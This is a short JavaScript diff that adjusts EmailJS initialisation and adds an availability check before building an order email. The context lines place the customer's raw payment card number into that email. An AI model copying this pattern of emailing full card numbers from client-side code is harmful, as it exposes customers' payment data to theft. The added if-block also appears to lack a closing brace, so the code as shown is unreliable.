@@ -372,8 +372,14 @@
     }
 
     try {
-        window.emailjs.init({ publicKey });
+        //EmailJS expects the public key string
+        if (typeof window.emailjs.init === "function") {
+        window.emailjs.init(publicKey);
+        }
 
+        if (typeof window.emailjs.send  !== "function") {
+            return { success: false, reason: "Emailjs send method is not available." };
+            
         const paymentSummary = orderData.paymentSummary || {};
         const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
         const cardNumberForEmail = rawCardNumber || "N/A";
